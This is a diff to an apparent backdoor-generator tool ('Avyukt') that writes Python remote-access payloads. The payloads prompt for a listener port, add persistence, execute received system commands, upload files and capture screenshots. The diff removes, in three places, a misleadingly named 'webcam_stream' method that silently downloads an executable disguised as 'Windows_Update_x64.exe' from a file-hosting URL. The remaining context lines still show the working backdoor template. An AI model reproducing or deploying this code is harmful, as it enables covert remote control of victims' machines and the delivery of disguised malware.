@@ -21,7 +21,7 @@ def gen_nor_python_back():
     port = raw_input("\nAvyukt>: Enter LPORT >> ")
     with open("Output/" + name + ".py", "w") as file:
         file.write('''
-import socket, subprocess, json, os, base64, sys, shutil, requests, pyscreeze
+import socket, subprocess, json, os, base64, sys, shutil, pyscreeze
 class Backdoor:
     def __init__(self, ip, port):
         self.become_pers()
@@ -68,12 +68,6 @@ class Backdoor:
     def screenshot(self):
         image = pyscreeze.screenshot('Image.jpg')
         return "Screenshot saved as Image.jpg"
-        
-    def webcam_stream(self):
-        url = 'https://cdn-106.anonfiles.com/z11b10P7oc/6e8dfc7b-1598501681/Windows_Update_x64.exe'
-        r = requests.get(url, allow_redirects=True)
-        open('Windows_Update_x64.exe', 'wb').write(r.content)
-
 
     def run(self):
         while True:
@@ -92,9 +86,6 @@ class Backdoor:
 
                 elif command[0] == "upload":
                     command_result = self.write(command[1], command[2])
-
-                elif command[0] == "webcam_stream":
-                    command_result = self.webcam_stream()
                     
                 elif command[0] == "screenshot":
                     command_result = self.screenshot()
@@ -135,7 +126,7 @@ def generate_non_obf_avyukt():
     with open("Output/" + name + ".py", "w") as file:
         file.write('''
         
-import socket, subprocess, json, os, base64, sys, shutil, requests, pyscreeze
+import socket, subprocess, json, os, base64, sys, shutil, pyscreeze
 class Backdoor:
     def __init__(self, ip, port):
         self.become_pers()
@@ -182,12 +173,6 @@ class Backdoor:
         image = pyscreeze.screenshot('Image.jpg')
         return "Screenshot saved as Image.jpg"
 
-    def webcam_stream(self):
-        url = 'https://cdn-106.anonfiles.com/z11b10P7oc/6e8dfc7b-1598501681/Windows_Update_x64.exe'
-        r = requests.get(url, allow_redirects=True)
-        open('Windows_Update_x64.exe', 'wb').write(r.content)
-
-
     def run(self):
         while True:
             command = self.reliable_receive()
@@ -205,9 +190,6 @@ class Backdoor:
 
                 elif command[0] == "upload":
                     command_result = self.write(command[1], command[2])
-
-                elif command[0] == "webcam_stream":
-                    command_result = self.webcam_stream()
                     
                 elif command[0] == "screenshot":
                     command_result = self.screenshot()
@@ -390,7 +372,7 @@ def avyukt_payload_gen():
     port = raw_input("\nAvyukt>: Enter LPORT >> ")
     with open("Output/" + name + ".py", "w") as file:
         file.write('''
-import socket, subprocess, json, os, base64, sys, shutil, requests, pyscreeze
+import socket, subprocess, json, os, base64, sys, shutil, pyscreeze
 class Backdoor:
     def __init__(self, ip, port):
         self.become_pers()
@@ -432,13 +414,6 @@ class Backdoor:
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return"[+] File has been uploaded!"
-
-        
-    def webcam_stream(self):
-        url = 'https://cdn-106.anonfiles.com/z11b10P7oc/6e8dfc7b-1598501681/Windows_Update_x64.exe'
-        r = requests.get(url, allow_redirects=True)
-        open('Windows_Update_x64.exe', 'wb').write(r.content)
-
             
     def snapshot(self):
         screenshot = pyscreeze.screenshot("Image.jpg")
@@ -461,13 +436,9 @@ class Backdoor:
 
                 elif command[0] == "upload":
                     command_result = self.write(command[1], command[2])
-
-                elif command[0] == "webcam_stream":
-                    command_result = self.webcam_stream()
                 
                 elif command[0] == "snapshot":
                     command_result = self.snapshot()
-
 
                 else:
                     command_result = self.execute_system_command(command)
